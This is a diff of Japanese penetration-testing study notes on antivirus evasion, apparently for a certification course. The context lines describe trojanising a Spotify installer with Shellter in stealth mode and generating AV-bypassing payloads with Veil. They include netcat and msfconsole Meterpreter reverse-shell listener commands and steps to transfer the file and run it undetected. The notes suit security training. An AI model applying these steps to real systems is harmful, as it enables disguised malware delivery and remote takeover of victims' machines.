@@ -230,6 +230,7 @@ function xb {
 - 以下はVirusTotalの画面だが、今回のテストで使用しているAviraは検知ベンダーに記載なし
 
 ![](../画像ファイル/Pasted%20image%2020250702122439.png)
+
 $$VirusTotalでAviraは検知していない$$
 
 補足：検知された場合
@@ -326,7 +327,7 @@ sudo rlwrap nc -lvnp 4444
 
 ## Shellterによるシェルコードインジェクション
 
-無料のAV回避ツールである[*Shellter*](https://www.shellterproject.com/)を使う
+無料のAV回避ツールである🔗[*Shellter*](https://www.shellterproject.com/)を使う
 
 ### Shellterとは
 
@@ -356,6 +357,7 @@ shellter
 	↓
 
 ![](../画像ファイル/Pasted%20image%2020250704072258.png)
+
 $$Shellter起動画面$$
 
 #### Shellterのモードについて
@@ -383,25 +385,33 @@ Choose Operation Mode - Auto/Manual (A/M/H):    A
 	- 今回はSpotifyインストーラー（EXE）を選択
 	- ShellterはPEファイルに対し、変更を加える前に自動でバックアップを作成する
 	- ⚠️少し待つ
+
 ![](../画像ファイル/Pasted%20image%2020250704122954.png)
+
 $$ターゲットPEの選択・自動バックアップ$$
 
 3. ステルスモードを有効に選択（Y）
-	- ペイロードを実行した後、通常のPEとして振る舞うようにする
+	- ペイロードを実行した後、通常のPEとして振る舞うようにする　
+
 ![](../画像ファイル/Pasted%20image%2020250704124053.png)
+
 $$StealthModeの選択と有効なペイロード一覧$$
 
 4. 使用するペイロードを選択する
 	- L：リストにあるペイロードを使う
 	- C：自作のペイロードを使う
 	- ここでは1番を選択する。msfvenomのように、LHOST、LPORTの入力が求められる。
+
 ![](../画像ファイル/Pasted%20image%2020250704124409.png)
+
 $$ペイロードの選択$$
 
 5. Verification（有効かどうかを検証）する
 	- Info、Warningを読む
 	- Enterを押すとターゲットPEファイルが悪意あるPEファイルに変換される
+
 ![](../画像ファイル/Pasted%20image%2020250704124644.png)
+
 $$Verification Stage$$
 
 6. ターゲットに送る前に攻撃者のマシン上でmeterpreterリスナーを立てる
@@ -416,7 +426,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 
 ## Veil-frameworkを使ったAV evasion
 
-- [Veil-framwork - GitHub](https://github.com/Veil-Framework/Veil)は、一般的なAVをバイパスするmetasploitペイロードを生成するために設計されたツール
+- 🔗[Veil-framwork - GitHub](https://github.com/Veil-Framework/Veil)は、一般的なAVをバイパスするmetasploitペイロードを生成するために設計されたツール
 	- ==msfvenomのエンコードだけではバイパスは難しい==
 - [Module 16：Antivirus Evasion](#🚨.ps1ファイルの欠点)のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。
 
@@ -439,7 +449,9 @@ sudo veil
 ```zsh
 use 1
 ```
+
 ![](../画像ファイル/Pasted%20image%2020250705204358.png)
+
 $$Veilの起動・Evasionの選択$$
 
 3. PowerShellのbatファイル生成ペイロードを選択
@@ -484,4 +496,5 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 ```
 
 7. [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
+
 8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得
